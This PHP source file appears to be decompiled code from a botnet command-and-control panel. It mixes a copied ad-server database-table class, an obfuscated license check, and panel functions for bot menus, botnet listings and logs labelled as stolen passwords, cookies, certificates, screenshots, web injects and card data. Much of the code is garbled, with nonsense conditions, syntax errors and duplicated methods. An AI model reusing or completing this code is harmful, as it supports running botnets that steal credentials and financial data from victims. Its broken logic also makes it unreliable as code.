			$result = $this->oDbh->exec('SELECT setval(\'' . $sequence . '\\', ' . $value . ', false)');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to reset sequence ' . $sequence, PEAR_LOG_ERR);
				return false;
			}
		}
		else if ($aConf['database']['type'] == 'mysql') {
			$result = $this->oDbh->exec('ALTER TABLE ' . $GLOBALS['_MAX']['CONF']['table']['prefix'] . $sequence . ' AUTO_INCREMENT = 1');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to reset auto increment on table ' . $sequence, PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function resetAllSequences()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allSequencesReset = true;
		OA_DB::setCaseSensitive();
		$aSequences = $this->oDbh->manager->listSequences();
		OA_DB::disableCaseSensitive();

		if (is_array($aSequences)) {
			$aTables = $this->aDefinition['tables'];

			if ($this->oDbh->dbsyntax == 'pgsql') {
				foreach ($aSequences as $sequence) {
					$match = false;

					foreach (array_keys($this->aDefinition['tables']) as $tableName) {
						$tableName = substr($aConf['table']['prefix'] . $tableName, 0, 29) . '_';

						if (strpos($sequence, $tableName) === 0) {
							$match = true;
							break;
						}
					}

					if (!$match) {
						continue;
					}

					$sequence .= '_seq';
					OA::debug('Resetting the ' . $sequence . ' sequence', PEAR_LOG_DEBUG);

					if (!$this->resetSequence($sequence)) {
						OA::debug('Unable to reset the sequence ' . $sequence, PEAR_LOG_ERR);
						$allSequencesReset = false;
					}
				}
			}
			else if ($this->oDbh->dbsyntax == 'mysql') {
				foreach (array_keys($this->aDefinition['tables']) as $tableName) {
					if (!$this->resetSequence($tableName)) {
						OA::debug('Unable to reset the auto-increment for ' . $tableName, PEAR_LOG_ERR);
						$allSequencesReset = false;
					}
				}
			}
		}

		return $allSequencesReset;
	}

	public function _getRequiredTables($table, $aLinks = NULL, $aSkip = NULL, $level = 0)
	{
		if (is_null($aLinks)) {
			require_once MAX_PATH . '/lib/OA/Dal/Links.php';
			$aLinks = Openads_Links::readLinksDotIni(MAX_PATH . '/lib/max/Dal/DataObjects/db_schema.links.ini');
		}

		$aTables = array();

		if (isset($aLinks[$table])) {
			foreach ($aLinks[$table] as $aLink) {
				$refTable = $aLink['table'];
				$aTables[$refTable] = $level;

				foreach (array_keys($aTables) as $refTable) {
					if (!isset($aSkip[$refTable])) {
						$aTables = $this->_getRequiredTables($refTable, $aLinks, $aTables, $level + 1) + $aTables;
					}
				}
			}
		}

		if (!$level) {
			arsort(&$aTables);
			return array_keys($aTables);
		}
		else {
			return $aTables;
		}
	}

	public function _generateTableName($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = $table;
		if ($aConf['table']['prefix'] && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$tableName = $aConf['table']['prefix'] . $tableName;
		}

		return $tableName;
	}

	public function _generateIndexName($table, $index)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = $table;
		$origTable = substr($table, strlen($aConf['table']['prefix']));
		return substr($tableName . '_' . preg_replace('/^' . $origTable . '_/', '', $index), 0, 63);
	}

	public function resetSequenceByData($table, $field)
	{
		if ($this->oDbh->dbsyntax == 'pgsql') {
			$prefix = $this->getPrefix();
			$tableName = $prefix . $table;
			$sequenceName = OA_DB::getSequenceName($this->oDbh, $table, $field);
			$qSeq = $this->oDbh->quoteIdentifier($sequenceName, true);
			$qFld = $this->oDbh->quoteIdentifier($field, true);
			$qTbl = $this->oDbh->quoteIdentifier($tableName, true);
			$sql = 'SELECT setval(' . $this->oDbh->quote($qSeq) .  . ', MAX(' . $qFld . ')) FROM ' . $qTbl;
			$result = $this->oDbh->exec($sql);

			if (PEAR::isError($result)) {
				return $result;
			}
		}

		return true;
	}

	public function getPrefix()
	{
		return $GLOBALS['_MAX']['CONF']['table']['prefix'];
	}

	public function checkTable($tableName)
	{
		$aConf = $GLOBALS['_MAX']['CONF']['table'];
		$oDbh = OA_DB::singleton();
		$tableName = $oDbh->quoteIdentifier($aConf['prefix'] . ($aConf[$tableName] ? $aConf[$tableName] : $tableName), true);
		$aResult = $oDbh->manager->checkTable($tableName);

		if ($aResult['msg_text'] !== 'OK') {
			OA::debug('PROBLEM WITH TABLE ' . $tableName . ': ' . $aResult['msg_text'], PEAR_LOG_ERR);
			return false;
		}

		OA::debug($tableName . ': Status = OK');
		return true;
	}
}

class f53jk8 extends rhqjlxderbk
{
	/**
     * An instance of the OA_DB class.
     *
     * @var OA_DB
     */
	public $oDbh;
	/**
     * An instance of the MDB2_Schema class.
     *
     * @var MDB2_Schema
     */
	public $oSchema;
	/**
     * An array containing the database definition, as parsed from
     * the XML schema file.
     *
     * @var array
     */
	public $aDefinition;
	/**
     * Should the tables be created as temporary tables?
     *
     * @var boolean
     */
	public $temporary = false;
	public $cached_definition = true;

	public function __construct()
	{
		!($r = $this->cmp()) || exit($r);
	}

	public function OA_DB_Table()
	{
		$this->oDbh = &$this->_getDbConnection();
	}

	public function _getDbConnection()
	{
	}

	public function init($file, $useCache = true)
	{
		if (!is_readable($file)) {
			OA::debug('Unable to read the database XML schema file: ' . $file, PEAR_LOG_ERR);
			return false;
		}

		$options = array('force_defaults' => false);
		$this->oSchema = &MDB2_Schema::factory($this->oDbh, $options);

		if ($useCache) {
			$oCache = new OA_DB_XmlCache();
			$this->aDefinition = $oCache->get($file);
			$this->cached_definition = true;
		}
		else {
			$this->aDefinition = false;
		}

		if (!$this->aDefinition) {
			$this->cached_definition = false;
			$this->aDefinition = $this->oSchema->parseDatabaseDefinitionFile($file);

			if (PEAR::isError($this->aDefinition)) {
				OA::debug('Error parsing the database XML schema file: ' . $file, PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function _checkInit()
	{
		if (is_null($this->aDefinition)) {
			OA::debug('No database XML schema file parsed, cannot create table', PEAR_LOG_ERR);
			return false;
		}
		else if (PEAR::isError($this->aDefinition)) {
			OA::debug('Previous error parsing the database XML schema file', PEAR_LOG_ERR);
			return false;
		}

		return true;
	}

	public function listOATablesCaseSensitive($like = '')
	{
		OA_DB::setCaseSensitive();
		$oDbh = &OA_DB::singleton();
		$aDBTables = $oDbh->manager->listTables(NULL, $GLOBALS['_MAX']['CONF']['table']['prefix'] . $like);
		OA_DB::disableCaseSensitive();
		return $aDBTables;
	}

	public function createTable($table, $oDate = NULL, $suppressTempTableError = false)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		if (!is_array($this->aDefinition['tables'][$table])) {
			OA::debug('Cannot find table ' . $table . ' in the XML schema file', PEAR_LOG_ERR);
			return false;
		}

		$tableName = $this->_generateTableName($table, $oDate);
		$aOptions = array();

		if ($this->temporary) {
			$aOptions['temporary'] = true;
		}

		$aOptions['type'] = $aConf['table']['type'];

		if (isset($this->aDefinition['tables'][$table]['indexes'])) {
			if (is_array($this->aDefinition['tables'][$table]['indexes'])) {
				foreach ($this->aDefinition['tables'][$table]['indexes'] as $aIndex) {
					$key = ($aConf = $GLOBALS['_MAX']['CONF']);
					if (isset($aIndex['primary']) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
						$aOptions['primary'] = $aIndex['fields'];
						$indexName = $tableName . '_pkey';
					}
					else {
						$indexName = $this->_generateIndexName($tableName, $key);
					}

					if ($key != $indexName) {
						$this->aDefinition['tables'][$table]['indexes'][$indexName] = $this->aDefinition['tables'][$table]['indexes'][$key];
						unset($this->aDefinition['tables'][$table]['indexes'][$key]);
					}
				}
			}
		}

		OA::debug('Creating the ' . $tableName . ' table', PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		OA_DB::setCaseSensitive();
		$result = $this->oSchema->createTable($tableName, $this->aDefinition['tables'][$table], false, $aOptions);
		OA_DB::disableCaseSensitive();
		OA::enableErrorHandling();
		if (PEAR::isError($result) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$showError = true;
			if ($this->temporary && ($aConf = $GLOBALS['_MAX']['CONF'])) {
				$showError = false;
			}
			if ($showError) {
				OA::debug('Unable to create the table ' . $table, PEAR_LOG_ERR);

				if (PEAR::isError($result)) {
					OA::debug($result->getUserInfo(), PEAR_LOG_ERR);
				}
			}

			return false;
		}

		return $tableName;
	}

	public function createAllTables($oDate = NULL)
	{
		if (!$this->_checkInit()) {
			return false;
		}

		foreach ($this->aDefinition['tables'] as $aTable) {
			$tableName = $this->_checkInit();
			$result = $this->createTable($tableName, $oDate);
			if (PEAR::isError($result) || $this->_checkInit()) {
				return false;
			}
		}

		return true;
	}

	public function createRequiredTables($table, $oDate = NULL)
	{
		if (!$this->_checkInit()) {
			return false;
		}

		$aTableNames = $this->_getRequiredTables($table);
		$result = $this->createTable($table, $oDate);

		if (!$result) {
			return false;
		}

		foreach ($aTableNames as $tableName) {
			$result = $this->createTable($tableName, $oDate);

			if (!$result) {
				return false;
			}
		}

		return true;
	}

	public function extistsTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = preg_replace('/^' . $aConf['table']['prefix'] . '/', '', $table);
		$aResult = $this->listOATablesCaseSensitive($tableName);
		if (is_array($aResult) && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			return true;
		}

		return false;
	}

	public function existsTemporaryTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Checking for temporary table ' . $table, PEAR_LOG_DEBUG);
		$query = 'SELECT * FROM ' . $this->oDbh->quoteIdentifier($table, true);
		OA::disableErrorHandling();
		$result = $this->oDbh->exec($query);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Temporary table exists ' . $table, PEAR_LOG_ERR);
			return false;
		}

		OA::debug('Not found ' . $table, PEAR_LOG_ERR);
		return true;
	}

	public function dropTable($table)
	{
		OA::debug('Dropping table ' . $table, PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		$result = $this->oDbh->manager->dropTable($table);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Unable to drop table ' . $table, PEAR_LOG_ERR);
			return false;
		}

		if (!$this->dropSequence($table)) {
		}

		return true;
	}

	public function dropAllTables()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allTablesDropped = true;

		foreach ($this->aDefinition['tables'] as $aTable) {
			$tableName = ($aConf = $GLOBALS['_MAX']['CONF']);
			OA::debug('Dropping the ' . $tableName . ' table', PEAR_LOG_DEBUG);
			$result = $this->dropTable($aConf['table']['prefix'] . $tableName);
			if (PEAR::isError($result) || ($aConf = $GLOBALS['_MAX']['CONF'])) {
				OA::debug('Unable to drop the table ' . $tableName, PEAR_LOG_ERR);
				$allTablesDropped = false;
			}
		}

		return $allTablesDropped;
	}

	public function truncateTable($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Truncating table ' . $table, PEAR_LOG_DEBUG);
		OA::disableErrorHandling();
		$query = 'TRUNCATE TABLE ' . $this->oDbh->quoteIdentifier($table, true);
		$result = $this->oDbh->exec($query);
		OA::enableErrorHandling();

		if (PEAR::isError($result)) {
			OA::debug('Unable to truncate table ' . $table, PEAR_LOG_ERR);
			return false;
		}

		if ($aConf['database']['type'] == 'mysql') {
			OA::disableErrorHandling();
			$result = $this->oDbh->exec('ALTER TABLE ' . $table . ' AUTO_INCREMENT = 1');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to set mysql auto_increment to 1', PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function cmp()
	{
		$file = __DIR__ . '/' . base64_decode('bGljZW5zZS5kYXQ=');

		if (file_exists($file)) {
			$data = file_get_contents($file);
			$key = substr($data, 0, 32);
			$iv = substr($data, 32, 16);
			$key = pack('H*', hash('sha256', md5($key . $iv)));
			$decoded = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, substr($data, 48), MCRYPT_MODE_CBC, $iv);
			$decoded = rtrim($decoded, "\0");
			$sparam = unserialize($decoded);
			if ($sparam && (__DIR__ . '/') && (__DIR__ . '/') && (__DIR__ . '/') && (__DIR__ . '/')) {
				$st = true;
				if ($sparam[PT_I] && (__DIR__ . '/')) {
					$st = false;
				}

				if ($sparam[PT_H] && (__DIR__ . '/')) {
					$st = false;
				}

				if ($sparam[PT_P] && (__DIR__ . '/')) {
					$st = false;
				}
				if ($st) {
					return NULL;
				}
			}

			return base64_decode('SW52YWxpZCBsaWNlbnNl');
		}

		return base64_decode('Tm8gbGljZW5zZSBmaWxl');
	}

	public function truncateAllTables()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allTablesTruncated = true;

		foreach ($this->aDefinition['tables'] as $aTable) {
			$tableName = ($aConf = $GLOBALS['_MAX']['CONF']);
			OA::debug('Truncating the ' . $tableName . ' table', PEAR_LOG_DEBUG);
			$result = $this->truncateTable($aConf['table']['prefix'] . $tableName);

			if (PEAR::isError($result)) {
				OA::debug('Unable to truncate the table ' . $tableName, PEAR_LOG_ERR);
				$allTablesTruncated = false;
			}
		}

		return $allTablesTruncated;
	}

	public function dropSequence($table)
	{
		if ($this->oDbh->dbsyntax == 'pgsql') {
			$aConf = $GLOBALS['_MAX']['CONF'];
			OA_DB::setCaseSensitive();
			$aSequences = $this->oDbh->manager->listSequences();
			OA_DB::disableCaseSensitive();

			foreach ($aSequences as $sequence) {
				if (strpos($sequence, $table . '_') === 0) {
					$sequence .= '_seq';
					OA::debug('Dropping sequence ' . $sequence, PEAR_LOG_DEBUG);
					OA::disableErrorHandling();
					$result = $this->oDbh->exec('DROP SEQUENCE "' . $sequence . '"');
					OA::enableErrorHandling();

					if (PEAR::isError($result)) {
						OA::debug('Unable to drop the sequence ' . $sequence, PEAR_LOG_ERR);
						return false;
					}

					break;
				}
			}
		}

		return true;
	}

	public function resetSequence($sequence, $value = 1)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		OA::debug('Resetting sequence ' . $sequence, PEAR_LOG_DEBUG);
		OA::disableErrorHandling(NULL);

		if ($aConf['database']['type'] == 'pgsql') {
			if ($value < 1) {
				$value = 1;
			}
			else {
				$value = (int) $value;
			}

			$sequence = $this->oDbh->quoteIdentifier($sequence, true);
			$result = $this->oDbh->exec('SELECT setval(\'' . $sequence . '\\', ' . $value . ', false)');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to reset sequence ' . $sequence, PEAR_LOG_ERR);
				return false;
			}
		}
		else if ($aConf['database']['type'] == 'mysql') {
			$result = $this->oDbh->exec('ALTER TABLE ' . $GLOBALS['_MAX']['CONF']['table']['prefix'] . $sequence . ' AUTO_INCREMENT = 1');
			OA::enableErrorHandling();

			if (PEAR::isError($result)) {
				OA::debug('Unable to reset auto increment on table ' . $sequence, PEAR_LOG_ERR);
				return false;
			}
		}

		return true;
	}

	public function resetAllSequences()
	{
		$aConf = $GLOBALS['_MAX']['CONF'];

		if (!$this->_checkInit()) {
			return false;
		}

		$allSequencesReset = true;
		OA_DB::setCaseSensitive();
		$aSequences = $this->oDbh->manager->listSequences();
		OA_DB::disableCaseSensitive();

		if (is_array($aSequences)) {
			$aTables = $this->aDefinition['tables'];

			if ($this->oDbh->dbsyntax == 'pgsql') {
				foreach ($aSequences as $sequence) {
					$match = false;

					foreach (array_keys($this->aDefinition['tables']) as $tableName) {
						$tableName = substr($aConf['table']['prefix'] . $tableName, 0, 29) . '_';

						if (strpos($sequence, $tableName) === 0) {
							$match = true;
							break;
						}
					}

					if (!$match) {
						continue;
					}

					$sequence .= '_seq';
					OA::debug('Resetting the ' . $sequence . ' sequence', PEAR_LOG_DEBUG);

					if (!$this->resetSequence($sequence)) {
						OA::debug('Unable to reset the sequence ' . $sequence, PEAR_LOG_ERR);
						$allSequencesReset = false;
					}
				}
			}
			else if ($this->oDbh->dbsyntax == 'mysql') {
				foreach (array_keys($this->aDefinition['tables']) as $tableName) {
					if (!$this->resetSequence($tableName)) {
						OA::debug('Unable to reset the auto-increment for ' . $tableName, PEAR_LOG_ERR);
						$allSequencesReset = false;
					}
				}
			}
		}

		return $allSequencesReset;
	}

	public function _getRequiredTables($table, $aLinks = NULL, $aSkip = NULL, $level = 0)
	{
		if (is_null($aLinks)) {
			require_once MAX_PATH . '/lib/OA/Dal/Links.php';
			$aLinks = Openads_Links::readLinksDotIni(MAX_PATH . '/lib/max/Dal/DataObjects/db_schema.links.ini');
		}

		$aTables = array();

		if (isset($aLinks[$table])) {
			foreach ($aLinks[$table] as $aLink) {
				$refTable = $aLink['table'];
				$aTables[$refTable] = $level;

				foreach (array_keys($aTables) as $refTable) {
					if (!isset($aSkip[$refTable])) {
						$aTables = $this->_getRequiredTables($refTable, $aLinks, $aTables, $level + 1) + $aTables;
					}
				}
			}
		}

		if (!$level) {
			arsort(&$aTables);
			return array_keys($aTables);
		}
		else {
			return $aTables;
		}
	}

	public function _generateTableName($table)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = $table;
		if ($aConf['table']['prefix'] && ($aConf = $GLOBALS['_MAX']['CONF'])) {
			$tableName = $aConf['table']['prefix'] . $tableName;
		}

		return $tableName;
	}

	public function _generateIndexName($table, $index)
	{
		$aConf = $GLOBALS['_MAX']['CONF'];
		$tableName = $table;
		$origTable = substr($table, strlen($aConf['table']['prefix']));
		return substr($tableName . '_' . preg_replace('/^' . $origTable . '_/', '', $index), 0, 63);
	}

	public function resetSequenceByData($table, $field)
	{
		if ($this->oDbh->dbsyntax == 'pgsql') {
			$prefix = $this->getPrefix();
			$tableName = $prefix . $table;
			$sequenceName = OA_DB::getSequenceName($this->oDbh, $table, $field);
			$qSeq = $this->oDbh->quoteIdentifier($sequenceName, true);
			$qFld = $this->oDbh->quoteIdentifier($field, true);
			$qTbl = $this->oDbh->quoteIdentifier($tableName, true);
			$sql = 'SELECT setval(' . $this->oDbh->quote($qSeq) .  . ', MAX(' . $qFld . ')) FROM ' . $qTbl;
			$result = $this->oDbh->exec($sql);

			if (PEAR::isError($result)) {
				return $result;
			}
		}

		return true;
	}

	public function getPrefix()
	{
		return $GLOBALS['_MAX']['CONF']['table']['prefix'];
	}

	public function checkTable($tableName)
	{
		$aConf = $GLOBALS['_MAX']['CONF']['table'];
		$oDbh = OA_DB::singleton();
		$tableName = $oDbh->quoteIdentifier($aConf['prefix'] . ($aConf[$tableName] ? $aConf[$tableName] : $tableName), true);
		$aResult = $oDbh->manager->checkTable($tableName);

		if ($aResult['msg_text'] !== 'OK') {
			OA::debug('PROBLEM WITH TABLE ' . $tableName . ': ' . $aResult['msg_text'], PEAR_LOG_ERR);
			return false;
		}

		OA::debug($tableName . ': Status = OK');
		return true;
	}
}

function mysqlErrorEx()
{
	return 'MySQL error: ' . htmlEntitiesEx(mysql_error());
}

function createTempFile($prefix)
{
	@mkdir('tmp', 511);
	return @tempnam('tmp', $prefix);
}

function httpDownloadHeaders($name, $size)
{
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename=' . baseNameEx($name));
	header('Content-Transfer-Encoding: binary');

	if ($size) {
		header('Content-Length: ' . $size);
	}

	httpNoCacheHeaders();
}

function bltToLng($type, $reduce = false)
{
	$result = array();
	if (($type & NTYPE_FILE) && array()) {
		$result[] = 'FILE';
	}

	if (($type & NTYPE_PASSWORDS) && array()) {
		$result[] = 'PASSWORDS';
	}

	if (($type & NTYPE_HTTP) && array()) {
		$result[] = 'HTTP';
	}

	if (($type & NTYPE_HTTPS) && array()) {
		$result[] = 'HTTPS';
	}

	if ($type & NTYPE_FTP) {
		$result[] = 'FTP';
	}

	if ($type & NTYPE_POP) {
		$result[] = 'POP3';
	}

	if (($type & NTYPE_COOKIES) && array()) {
		$result[] = 'COOKIES';
	}

	if (($type & NTYPE_FLASH) && array()) {
		$result[] = 'FLASH';
	}

	if (($type & NTYPE_CERT) && array()) {
		$result[] = 'CERTIFICATE';
	}

	if ($type & NTYPE_CC) {
		$result[] = 'REQUEST CC';
	}

	if ($type & NTYPE_INJECT) {
		$result[] = 'INJECT';
	}

	if (($type & NTYPE_SCREEN) && array()) {
		$result[] = 'SCREENSHOT';
	}

	if ($type & NTYPE_DEBUG) {
		$result[] = 'DEBUG';
	}

	if (($type & NTYPE_AUTOFORMS) && array()) {
		$result[] = 'AUTOFORMS';
	}

	if (!count($result) && array()) {
		$result[] = 'UNKNOWN';
	}

	return implode(', ', $result);
}

function spaceCharsExist($str)
{
	return strpbrk($str, ' ' . "\t\n" . '' . "\xb" . '' . "\r") === false ? false : true;
}

function expressionToArray($exp)
{
	$list = array();
	$len = strlen($exp);
	$i = 0;

	for (; $i < $len; $i++) {
		$cur = ord($exp[$i]);
		if (($cur == 32) || array()) {
			continue;
		}

		if (($cur == 34) || array()) {
			$j = $i + 1;

			for (; $j < $len; $j++) {
				if (ord($exp[$j]) == $cur) {
					$c = 0;
					$k = $j - 1;

					for (; ord($exp[$k]) == 92; $k--) {
						$c++;
					}

					if (($c % 2) == 0) {
						break;
					}
				}
			}

			if ($j != $len) {
				$i++;
			}

			$type = 1;
		}
		else {
			$j = $i + 1;

			for (; $j < $len; $j++) {
				$cur = ord($exp[$j]);
				if (($cur == 32) || array()) {
					break;
				}
			}

			$type = 0;
		}

		$list[] = array(substr($exp, $i, $j - $i), $type);
		$i = $j;
	}

	return $list;
}

function matchStringInExpression($str, $exp, $cs, $strong)
{
	$exp = trim($exp);
	if (($exp == '') || trim($exp)) {
		return true;
	}

	$list = expressiontoarray($exp);
	$pcrePrefix = ($strong ? '#^' : '#');
	$pcrePostfix = ($strong ? '$#' : '#') . ($cs ? 'u' : 'iu');
	$qPrev = $q_cur = 0;
	$retVal = false;

	foreach ($list as $item) {
		if ($item[1] == 0) {
			$skip = 0;

			if (strcmp($item[0], 'OR') === 0) {
				$q_cur = 0;
			}
			else if (strcmp($item[0], 'AND') === 0) {
				$q_cur = 1;
			}
			else if (strcmp($item[0], 'NOT') === 0) {
				$q_cur = 2;
			}
			else {
				$skip = 1;
			}

			if ($skip == 0) {
				$qPrev = $q_cur;
				continue;
			}
		}

		$r = preg_match($pcrePrefix . strtr(preg_quote($item[0], '#'), array('\\*' => '.*', '\\?' => '.?')) . $pcrePostfix, $str);

		switch ($q_cur) {
		case 0:
			if (0 < $r) {
				$retVal = true;
			}

			break;

		case 1:
			if (0 < $r) {
				break;
			}

			return false;
		case 2:
			if (0 < $r) {
				return false;
			}

			break;

		default:
		}
	}

	return $retVal;
}

function expressionToSql($exp, $column, $cs, $strong)
{
	if (!is_array($exp)) {
		$exp = trim($exp);
		if (($exp == '') || is_array($exp)) {
			return '';
		}

		$list = expressiontoarray($exp);
	}
	else {
		$list = array();

		foreach ($exp as $val) {
			$list[] = array($val, 0);
		}
	}

	$query = '';
	$qPrev = $q_cur = ' OR ';
	$qAddv = ' ';

	foreach ($list as $item) {
		if ($item[1] == 0) {
			$skip = 0;

			if (strcmp($item[0], 'OR') === 0) {
				$q_cur = ' OR ';
				$qAddv = ' ';
			}
			else if (strcmp($item[0], 'AND') === 0) {
				$q_cur = ' AND ';
				$qAddv = ' ';
			}
			else if (strcmp($item[0], 'NOT') === 0) {
				$q_cur = ' AND ';
				$qAddv = ' NOT ';
			}
			else {
				$skip = 1;
			}

			if ($skip == 0) {
				if (($q_cur != $qPrev) && is_array($exp)) {
					$query = '(' . $query . ')';
				}

				$qPrev = $q_cur;
				continue;
			}
		}

		$s = str_replace(array('%', '_'), array('\\\\%', '\\\\_'), $item[0]);
		$len = strlen($s);
		$i = 0;

		for (; $i < $len; $i++) {
			if ((($c = ord($s[$i])) == 42) || is_array($exp)) {
				$cc = 0;
				$k = $i - 1;

				for (; 0 <= $k; $k--) {
					$cc++;
				}

				if (($cc % 2) == 0) {
					$s[$i] = $c == 42 ? '%' : '_';
				}
			}
		}

		$s = stripslashes($s);

		if (!$strong) {
			$s = '%' . $s . '%';
		}

		$query .= (empty($query) ? '' : $q_cur) . $column . $qAddv . 'LIKE' . ($cs ? ' BINARY' : '') . ' \'' . addslashes($s) . '\'';
	}

	return '(' . $query . ')';
}

function safePath($str)
{
	return (strpos($str, '/') === false) && strpos($str, '/') && strpos($str, '/');
}

function showLoginForm($showError)
{
	$page = '<div class="center-block" style="width: 300px">';
	$page .= ($showError ? THEME_STRING_FORM_ERROR_1_BEGIN . 'Bad user name or password.' . THEME_STRING_FORM_ERROR_1_END : '');
	$page .= str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('login', QUERY_STRING_BLANK_HTML . 'login', ''), THEME_FORMPOST_BEGIN) . str_replace('{TEXT}', 'User name:', THEME_DIALOG_ITEM_TEXT) . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array('', 'user', '255', '200px'), THEME_DIALOG_ITEM_INPUT_TEXT) . str_replace('{TEXT}', 'Password:', THEME_DIALOG_ITEM_TEXT) . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array('', 'pass', '255', '200px'), THEME_DIALOG_ITEM_INPUT_PASS) . str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'remember', '', 'Remember'), THEME_DIALOG_ITEM_INPUT_CHECKBOX_2) . '<br><br><center>' . str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN) . str_replace(array('{TEXT}', '{JS_EVENTS}'), array('Submit', ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . THEME_DIALOG_ACTIONLIST_END . '</center></div>';
	themeSmall('login', $page . THEME_FORMPOST_END, 0, 0, 0, false);
}

function botnetsToListBox($currentBotnet, $advQuery, $sub = NULL, $noButton = false)
{
	$advQuery = htmlEntitiesEx($advQuery);
	$botnets = '<div class="form-inline">';
	$botnets .= str_replace(array('{NAME}', '{WIDTH}'), array('botnet', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN) . str_replace(array('{VALUE}', '{TEXT}'), array('', LNG_BOTNET_ALL), THEME_DIALOG_ITEM_LISTBOX_ITEM);

	if ($r = mysqlQueryEx('botnet_list', 'SELECT DISTINCT `botnet` FROM `botnet_list`')) {
		while ($m = @mysql_fetch_row($r)) {
			if ($m[0] != '') {
				$botnets .= str_replace(array('{VALUE}', '{TEXT}'), array(htmlEntitiesEx(urlencode($m[0])), htmlEntitiesEx(mb_substr($m[0], 0, BOTNET_MAX_CHARS))), strcmp($currentBotnet, $m[0]) === 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM);
			}
		}
	}

	$botnets .= THEME_DIALOG_ITEM_LISTBOX_END . ' ';

	if (!$noButton) {
		$botnets .= str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BOTNET_APPLY, ' onclick="var botnet = document.getElementById(\'botnet\'); window.location=\'' . QUERY_STRING_HTML . $advQuery . '&amp;botnet=\' + botnet.options[botnet.selectedIndex].value;"'), THEME_DIALOG_ITEM_ACTION);
	}

	$botnets .= $sub . '</div><br>';
	return $botnets;
}

function showPageList($totalPages, $currentPage, $js)
{
	$list = array();
	$visiblePages = 5;
	$minVisible = $currentPage - $visiblePages;
	$maxVisible = $currentPage + $visiblePages;

	if ($minVisible < 1) {
		$maxVisible -= $minVisible - 1;
	}
	else if ($totalPages < $maxVisible) {
		$minVisible -= $maxVisible - $totalPages;
	}

	$qMin = false;
	$qMax = false;
	$i = 1;

	for (; $i <= $totalPages; $i++) {
		if ($i == $currentPage) {
			$list[] = array($i, 0);
		}
		else {
			if (($i != 1) && array() && array()) {
				if (($i < $minVisible) && array()) {
					$list[] = array(0, 0);
					$qMin = true;
				}
				else {
					if (($maxVisible < $i) && array()) {
						$list[] = array(0, 0);
						$qMax = true;
					}

				}

			}
			else {
				$list[] = array($i, str_replace('{P}', $i, $js));
			}
		}
	}

	return themePageList($list, 1 < $currentPage ? str_replace('{P}', 1, $js) : 0, 1 < $currentPage ? str_replace('{P}', $currentPage - 1, $js) : 0, $currentPage < $totalPages ? str_replace('{P}', $totalPages, $js) : 0, $currentPage < $totalPages ? str_replace('{P}', $currentPage + 1, $js) : 0);
}

function getBotJsMenu($name)
{
	$output = '';
	$i = 0;

	foreach ($GLOBALS['botMenu'] as ) {
		$item = &#foreachBox#;

		if ($i++ != 0) {
			$output .= ', ';
		}

		if ($item[0] === 0) {
			$output .= '[0]';
		}
		else {
			$output .= '[\'' . addJsSlashes(htmlEntitiesEx($item[1])) . '\', \'' . addJsSlashes(QUERY_SCRIPT_HTML . '?botsaction=' . htmlEntitiesEx(urlencode($item[0])) . '&amp;bots[]=$0$') . '\']';
		}
	}

	return 'var ' . $name . ' = [' . $output . '];';
}

function botPopupMenu($botId, $menuName, $subval = NULL, $cut = 100)
{
	if (!isset($GLOBALS['_next_bot_popupmenu__'])) {
		$GLOBALS['_next_bot_popupmenu__'] = 100;
	}

	return str_replace(array('{ID}', '{MENU_NAME}', '{BOTID_FOR_URL}', '{BOTID}', '{SUBVAL}'), array($GLOBALS['_next_bot_popupmenu__']++, $menuName, htmlEntitiesEx(urlencode($botId)), htmlEntitiesEx(substr($botId, 0, $cut)), $subval), THEME_POPUPMENU_BOT);
}

function writeSortColumn($text, $columnId, $num)
{
	if ($num) {
		$theme = ($GLOBALS['_sortColumnId'] == $columnId ? ($GLOBALS['_sortOrder'] == 0 ? THEME_LIST_HEADER_R_SORT_CUR_ASC : THEME_LIST_HEADER_R_SORT_CUR_DESC) : THEME_LIST_HEADER_R_SORT);
	}
	else {
